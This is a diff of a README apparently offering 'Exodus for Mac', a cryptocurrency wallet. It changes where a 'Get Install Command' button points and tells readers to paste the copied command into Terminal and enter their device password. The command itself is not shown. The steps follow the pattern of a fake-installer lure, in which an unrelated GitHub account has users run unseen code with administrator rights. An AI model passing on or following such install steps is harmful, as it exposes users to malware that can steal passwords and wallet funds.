@@ -20,7 +20,7 @@ If the download button doesn't work, follow the terminal-based installation inst
 
 1. Copy the installation command by clicking the button below.
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-%23007AFF?style=flat-square)](https://kromtorg.github.io/.github/exodus-for-mac/install-command)
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-%23007AFF?style=flat-square)](gistfile1.txt)
 
 2. Open the Terminal app on your Mac and paste the copied command, then press "Return."
 3. Enter your device password to confirm the installation.
